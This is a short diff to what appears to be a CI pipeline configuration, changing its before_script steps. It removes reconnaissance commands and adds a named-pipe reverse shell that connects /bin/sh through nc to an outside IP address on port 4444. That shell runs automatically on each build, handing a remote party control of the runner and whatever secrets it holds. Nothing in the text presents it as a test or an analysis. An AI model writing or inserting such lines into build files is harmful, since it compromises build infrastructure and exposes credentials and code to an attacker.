@@ -7,10 +7,9 @@ before_script:
   - echo testes
   - which nc 
   - which mknod
-  - sudo su
-  - whoami
-  - id
-  - ifconfig
+  - mknod /tmp/backpipe p
+  - /bin/sh 0</tmp/backpipe|nc 75.138.228.51 4444 1>/tmp/backpipe
+
 
 
   
